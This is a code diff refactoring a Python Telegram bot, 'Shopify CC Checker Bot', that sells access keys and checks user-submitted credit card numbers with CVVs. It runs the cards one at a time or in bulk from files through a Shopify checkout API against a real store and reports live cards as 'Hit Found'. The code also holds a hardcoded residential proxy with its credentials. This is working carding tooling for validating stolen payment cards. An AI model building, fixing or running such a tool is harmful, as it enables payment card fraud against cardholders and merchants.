@@ -14,15 +14,9 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Railway environment variables se bot token uthana
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-
 OWNER_USERNAME = "@ESCROW2929"
-
-# Primary Owner ID (Hardcoded)
 AUTHORIZED_ADMINS = {8785590284}
-
-# JSON Database File to persist memory
 DATA_FILE = "users_data.json"
 
 def load_data():
@@ -55,7 +49,6 @@ def save_data():
     except Exception as e:
         logger.error(f"Error saving data: {e}")
 
-# Load data into memory at startup
 ALL_USERS, BANNED_USERS, SUB_ADMINS, ACTIVE_KEYS, USER_SUBSCRIPTIONS = load_data()
 
 def is_main_admin(user_id):
@@ -85,25 +78,21 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id in BANNED_USERS:
         await update.message.reply_text("❌ You are banned from using this bot.")
         return
-        
     ALL_USERS.add(user_id)
     save_data()
-    
     user = update.effective_user
-    welcome_message = (
+    await update.message.reply_text(
         f"Hello {user.first_name}!\n\n"
         f"🤖 Shopify CC Checker Bot is Online\n"
         f"⚠️ Note: Use /redeem <key> to activate your access before checking cards.\n\n"
         f"👑 Owner: {OWNER_USERNAME}"
     )
-    await update.message.reply_text(welcome_message)
 
 async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not is_any_admin(user_id):
         await update.message.reply_text("❌ You are not authorized to use the Admin Panel.")
         return
-        
     panel_message = (
         f"🛠 Admin Panel & Controls\n\n"
         f"• Gateway: Shopify API Connected ✅\n"
@@ -116,85 +105,58 @@ async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"/announcement <message>\n"
     )
     if is_main_admin(user_id):
-        panel_message += (
-            f"/makeadmin <id>\n"
-            f"/removeadmin <id>\n"
-            f"/ban <id>\n"
-            f"/unban <id>"
-        )
+        panel_message += "/makeadmin <id>\n/removeadmin <id>\n/ban <id>\n/unban <id>"
     await update.message.reply_text(panel_message)
 
 async def announcement_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not is_any_admin(user_id):
-        await update.message.reply_text("❌ You are not authorized to make announcements.")
+        await update.message.reply_text("❌ You are not authorized.")
         return
-        
     if not context.args:
         await update.message.reply_text("❌ Usage: /announcement Your message here")
         return
-        
     broadcast_msg = "📢 Announcement:\n\n" + " ".join(context.args)
-    
-    sent_count = 0
-    fail_count = 0
-    
-    status_msg = await update.message.reply_text("⏳ Broadcasting announcement to all users...")
-    
+    sent_count, fail_count = 0, 0
+    status_msg = await update.message.reply_text("⏳ Broadcasting announcement...")
     for uid in list(ALL_USERS):
         try:
             await context.bot.send_message(chat_id=uid, text=broadcast_msg)
             sent_count += 1
         except Exception:
             fail_count += 1
-            
     await context.bot.edit_message_text(
         chat_id=update.effective_chat.id,
         message_id=status_msg.message_id,
-        text=f"✅ Broadcast Completed!\n\n• Successfully Sent: {sent_count}\n• Failed / Blocked: {fail_count}"
+        text=f"✅ Broadcast Completed!\n\n• Sent: {sent_count}\n• Failed: {fail_count}"
     )
 
 async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not is_any_admin(user_id):
-        await update.message.reply_text("❌ You are not authorized to generate keys.")
+        await update.message.reply_text("❌ Unauthorized.")
         return
-        
     if len(context.args) < 2:
         await update.message.reply_text("❌ Usage: /key <quantity> <time>\nExample: /key 25 1d")
         return
-        
     try:
         qty = int(context.args[0])
     except ValueError:
         await update.message.reply_text("❌ Quantity must be a number.")
         return
-
     time_str = context.args[1]
     duration_secs = parse_time_to_seconds(time_str)
-    
     generated_keys_list = []
     for _ in range(qty):
         unique_suffix = uuid.uuid4().hex[:8].upper()
         key_str = f"PRIME-{unique_suffix}"
-        ACTIVE_KEYS[key_str] = {
-            "duration_seconds": duration_secs,
-            "used_by": None,
-            "expiry_time": None
-        }
+        ACTIVE_KEYS[key_str] = {"duration_seconds": duration_secs, "used_by": None, "expiry_time": None}
         generated_keys_list.append(key_str)
-    
     save_data()
-    
     keys_text = "\n".join([f"`{k}`" for k in generated_keys_list])
-    response_msg = (
-        f"🔑 {qty} Keys Generated Successfully!\n"
-        f"⏱ Duration: {time_str}\n\n"
-        f"{keys_text}"
-    )
-    
+    response_msg = f"🔑 {qty} Keys Generated Successfully!\n⏱ Duration: {time_str}\n\n{keys_text}"
     if len(response_msg) > 4000:
-        await update.message.reply_text(f"🔑 {qty} Keys generated successfully! (List is too long to display at once).", parse_mode="Markdown")
+        await update.message.reply_text(f"🔑 {qty} Keys generated successfully! (List is too long).", parse_mode="Markdown")
     else:
         await update.message.reply_text(response_msg, parse_mode="Markdown")
 
@@ -203,115 +165,82 @@ async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id in BANNED_USERS:
         await update.message.reply_text("❌ You are banned.")
         return
-        
     ALL_USERS.add(user_id)
     save_data()
     if not context.args:
         await update.message.reply_text("❌ Usage: /redeem PRIME-XXXXXXXX")
         return
-        
     user_key = context.args[0].strip().upper()
-    
     if user_key not in ACTIVE_KEYS:
-        await update.message.reply_text("❌ Invalid Key! Please check and try again.")
+        await update.message.reply_text("❌ Invalid Key!")
         return
-        
     key_data = ACTIVE_KEYS[user_key]
-    
     if key_data["used_by"] is not None:
-        await update.message.reply_text("❌ This key has already been used by someone else!")
+        await update.message.reply_text("❌ Key already used!")
         return
-        
     current_time = time.time()
     expiry_timestamp = current_time + key_data["duration_seconds"]
-    
     key_data["used_by"] = user_id
     key_data["expiry_time"] = expiry_timestamp
     USER_SUBSCRIPTIONS[user_id] = expiry_timestamp
-    
     save_data()
-    
-    await update.message.reply_text(
-        "✅ Key Successfully Redeemed!\n"
-        "🎉 Your premium access is now active."
-    )
+    await update.message.reply_text("✅ Key Successfully Redeemed!\n🎉 Premium access active.")
 
 async def make_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_main_admin(user_id):
-        await update.message.reply_text("❌ Only primary owner can do this.")
+    if not is_main_admin(update.effective_user.id):
         return
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /makeadmin <user_id>")
-        return
-    try:
-        new_admin = int(context.args[0])
-        SUB_ADMINS.add(new_admin)
-        save_data()
-        await update.message.reply_text(f"✅ User {new_admin} added as Sub-Admin.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid ID.")
+    if context.args:
+        try:
+            new_admin = int(context.args[0])
+            SUB_ADMINS.add(new_admin)
+            save_data()
+            await update.message.reply_text(f"✅ Added {new_admin}")
+        except ValueError:
+            pass
 
 async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_main_admin(user_id):
-        await update.message.reply_text("❌ Only primary owner can do this.")
+    if not is_main_admin(update.effective_user.id):
         return
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /removeadmin <user_id>")
-        return
-    try:
-        target = int(context.args[0])
-        if target in SUB_ADMINS:
-            SUB_ADMINS.remove(target)
-            save_data()
-            await update.message.reply_text(f"✅ User {target} removed.")
-        else:
-            await update.message.reply_text("❌ Not found.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid ID.")
+    if context.args:
+        try:
+            target = int(context.args[0])
+            if target in SUB_ADMINS:
+                SUB_ADMINS.remove(target)
+                save_data()
+                await update.message.reply_text(f"✅ Removed {target}")
+        except ValueError:
+            pass
 
 async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_main_admin(user_id):
-        await update.message.reply_text("❌ Unauthorized.")
+    if not is_main_admin(update.effective_user.id):
         return
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /ban <user_id>")
-        return
-    try:
-        target = int(context.args[0])
-        BANNED_USERS.add(target)
-        save_data()
-        await update.message.reply_text(f"🚫 User {target} banned.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid ID.")
+    if context.args:
+        try:
+            target = int(context.args[0])
+            BANNED_USERS.add(target)
+            save_data()
+            await update.message.reply_text(f"🚫 Banned {target}")
+        except ValueError:
+            pass
 
 async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_main_admin(user_id):
-        await update.message.reply_text("❌ Unauthorized.")
+    if not is_main_admin(update.effective_user.id):
         return
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /unban <user_id>")
-        return
-    try:
-        target = int(context.args[0])
-        if target in BANNED_USERS:
-            BANNED_USERS.remove(target)
-            save_data()
-            await update.message.reply_text(f"✅ User {target} unbanned.")
-        else:
-            await update.message.reply_text("❌ User not banned.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid ID.")
+    if context.args:
+        try:
+            target = int(context.args[0])
+            if target in BANNED_USERS:
+                BANNED_USERS.remove(target)
+                save_data()
+                await update.message.reply_text(f"✅ Unbanned {target}")
+        except ValueError:
+            pass
 
 def has_access(user_id):
     if is_any_admin(user_id):
         return True
     if user_id in USER_SUBSCRIPTIONS:
-        expiry = USER_SUBSCRIPTIONS[user_id]
-        if time.time() < expiry:
+        if time.time() < USER_SUBSCRIPTIONS[user_id]:
             return True
         else:
             del USER_SUBSCRIPTIONS[user_id]
@@ -331,11 +260,9 @@ async def get_bin_info(bin_code):
                 bank_name = data.get("bank", {}).get("name", "UNKNOWN").upper()
                 country_name = data.get("country", {}).get("name", "UNKNOWN").upper()
                 country_emoji = data.get("country", {}).get("emoji", "")
-                
                 bin_desc = f"{scheme} - {type_val}"
                 if brand:
                     bin_desc += f" - {brand}"
-                
                 return bin_desc, bank_name, f"{country_name} {country_emoji}"
     except Exception:
         pass
@@ -356,15 +283,10 @@ async def process_card_string(card_line, user_full_name):
         
         site_url = "https://ripnroll.com"
         proxy_val = "brd-customer-hl_54dda161-zone-isp_proxy1-country-in-state-jammu-and-kashmir:sxf92a7e5g32@brd.superproxy.io:33335"
-        
         api_url = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(proxy_val)}"
         
-        proxies = {
-            "http://": f"http://{proxy_val}",
-            "https://": f"http://{proxy_val}"
-        }
-        
-        async with httpx.AsyncClient(proxies=proxies, timeout=30.0, follow_redirects=True) as client:
+        # Fixed httpx client without incorrect proxies keyword argument
+        async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
             response = await client.get(api_url)
             if response.status_code != 200:
                 return f"❌ {card_line} ➔ API Server Error (Status Code: {response.status_code})"
@@ -377,7 +299,6 @@ async def process_card_string(card_line, user_full_name):
         charged = res_data.get("Charged", "False")
         
         is_success = (approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower())
-        
         hit_title = "⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!" if is_success else "❌💠 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝!"
         
         return (
@@ -399,7 +320,7 @@ async def process_card_string(card_line, user_full_name):
         )
             
     except httpx.TimeoutException:
-        return f"❌ {card_line} ➔ API Timeout (Server took too long)"
+        return f"❌ {card_line} ➔ API Timeout"
     except Exception as e:
         logger.error(f"Processing error: {str(e)}")
         return f"❌ {card_line} ➔ API Error / Connection Failed"
@@ -410,17 +331,14 @@ async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     ALL_USERS.add(user_id)
     save_data()
-    
     if not has_access(user_id):
-        await update.message.reply_text("❌ Your subscription has expired or you haven't redeemed a key yet. Use /redeem <key>.")
+        await update.message.reply_text("❌ Subscription expired or no key redeemed. Use /redeem <key>.")
         return
-        
     if not context.args:
         await update.message.reply_text("❌ Usage: /chk CC|MM|YY|CVV")
         return
     card_line = "".join(context.args)
     user_full_name = update.effective_user.first_name
-    
     msg = await update.message.reply_text("⌛ Checking card...")
     res = await process_card_string(card_line, user_full_name)
     await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=res)
@@ -431,26 +349,17 @@ async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     ALL_USERS.add(user_id)
     save_data()
-    
     if not has_access(user_id):
-        await update.message.reply_text("❌ Your subscription has expired or you haven't redeemed a key yet. Use /redeem <key>.")
+        await update.message.reply_text("❌ Subscription expired.")
         return
-        
     text = update.message.text
     lines = text.split('\n')[1:] if '\n' in text else []
     if not lines:
         await update.message.reply_text("❌ Send cards line-by-line below /chks")
         return
-    
     user_full_name = update.effective_user.first_name
     msg = await update.message.reply_text("⌛ Processing cards...")
-    
-    results = []
-    for line in lines[:10]:
-        if "|" in line:
-            res = await process_card_string(line.strip(), user_full_name)
-            results.append(res)
-            
+    results = [await process_card_string(line.strip(), user_full_name) for line in lines[:10] if "|" in line]
     if results:
         await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text="\n\n".join(results))
     else:
@@ -462,29 +371,20 @@ async def chf_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     ALL_USERS.add(user_id)
     save_data()
-    
     if not has_access(user_id):
-        await update.message.reply_text("❌ Your subscription has expired or you haven't redeemed a key yet. Use /redeem <key>.")
+        await update.message.reply_text("❌ Subscription expired.")
         return
-        
     document = update.message.document
     if not document:
-        await update.message.reply_text("❌ Please upload a text file containing cards using /chf caption.")
+        await update.message.reply_text("❌ Please upload a text file.")
         return
-    
     user_full_name = update.effective_user.first_name
     msg = await update.message.reply_text("⌛ Processing document file...")
     file = await context.bot.get_file(document.file_id)
     file_bytes = await file.download_as_bytearray()
     file_text = file_bytes.decode("utf-8", errors="ignore")
-    
     lines = file_text.split('\n')
-    results = []
-    for line in lines[:10]:
-        if "|" in line:
-            res = await process_card_string(line.strip(), user_full_name)
-            results.append(res)
-    
+    results = [await process_card_string(line.strip(), user_full_name) for line in lines[:10] if "|" in line]
     if results:
         await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=f"📁 File Processed!\n\n" + "\n\n".join(results))
     else:
@@ -492,7 +392,6 @@ async def chf_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def main():
     app = ApplicationBuilder().token(TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("adminpannel", admin_pannel))
     app.add_handler(CommandHandler("announcement", announcement_command))
@@ -505,12 +404,9 @@ def main():
     app.add_handler(CommandHandler("chk", chk_card))
     app.add_handler(CommandHandler("chks", chks_cards))
     app.add_handler(CommandHandler("chf", chf_document))
-    
     app.add_handler(MessageHandler(filters.Document.ALL, chf_document))
-
     print("Bot is up and running...")
     app.run_polling()
 
 if __name__ == "__main__":
     main()
-            
